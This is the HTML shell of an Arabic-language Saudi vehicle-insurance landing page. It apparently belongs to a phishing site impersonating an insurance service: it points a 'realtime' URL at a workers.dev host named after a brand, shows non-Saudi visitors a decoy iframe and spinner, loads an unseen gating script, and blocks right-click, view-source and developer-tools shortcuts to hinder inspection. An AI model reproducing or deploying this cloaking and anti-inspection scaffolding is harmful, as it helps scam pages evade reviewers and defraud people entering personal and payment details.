<!DOCTYPE html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" href="/logo.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>تأمين المركبات في السعودية</title>
    <script>
      window.__SAFE_REALTIME_URL__ = "https://tmin-edge.bcare.workers.dev";
    </script>
    <style>
      :root { color-scheme: light; }
      html, body { width: 100%; min-height: 100%; margin: 0; padding: 0; }
      body { overflow-x: hidden; background: #fff; }
      #root { min-height: 100vh; }
      #tmin-landing-frame {
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        border: 0;
        background: #fff;
        z-index: 1;
      }
      #tmin-landing-frame[hidden] { display: none; }
      #tmin-non-saudi-spinner {
        position: fixed;
        inset: 0;
        z-index: 50;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(219, 234, 254, .5);
        pointer-events: auto;
        cursor: wait;
      }
      #tmin-non-saudi-spinner[hidden] { display: none; }
      #tmin-non-saudi-spinner .text-center { text-align: center; }
      #tmin-non-saudi-spinner .mb-6 { margin-bottom: 1.5rem; }
      #tmin-non-saudi-spinner .mb-4 { margin-bottom: 1rem; }
      #tmin-non-saudi-spinner .animate-spin {
        width: 3rem;
        height: 3rem;
        margin-left: auto;
        margin-right: auto;
        border-radius: 9999px;
        border-bottom: 2px solid oklch(0.208 0.042 265.755);
        animation: zip-dB-spin 1s linear infinite;
      }
      @keyframes zip-dB-spin { to { transform: rotate(360deg); } }
    </style>
  </head>
  <body>
    <div id="root" hidden></div>
    <iframe
      id="tmin-landing-frame"
      title="تأمين المركبات"
      src="/old-landing.html?country=ZZ"
      loading="eager"
    ></iframe>
    <div id="tmin-non-saudi-spinner" aria-hidden="true">
      <div class="text-center">
        <div class="mb-6"></div>
        <div class="mb-4">
          <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto"></div>
        </div>
      </div>
    </div>
    <script>
      // Browser-side deterrent only; frontend files delivered to a browser
      // cannot be made secret. Normal form interaction remains available.
      (function () {
        document.addEventListener("contextmenu", function (event) { event.preventDefault(); });
        document.addEventListener("keydown", function (event) {
          var key = String(event.key || "").toLowerCase();
          if (key === "f12" ||
              (event.ctrlKey && key === "u") ||
              (event.ctrlKey && event.shiftKey && ["i", "j", "c"].indexOf(key) !== -1)) {
            event.preventDefault();
            event.stopPropagation();
          }
        }, true);
      })();
    </script>
    <script src="/landing-gate.js" defer></script>
  </body>
</html>
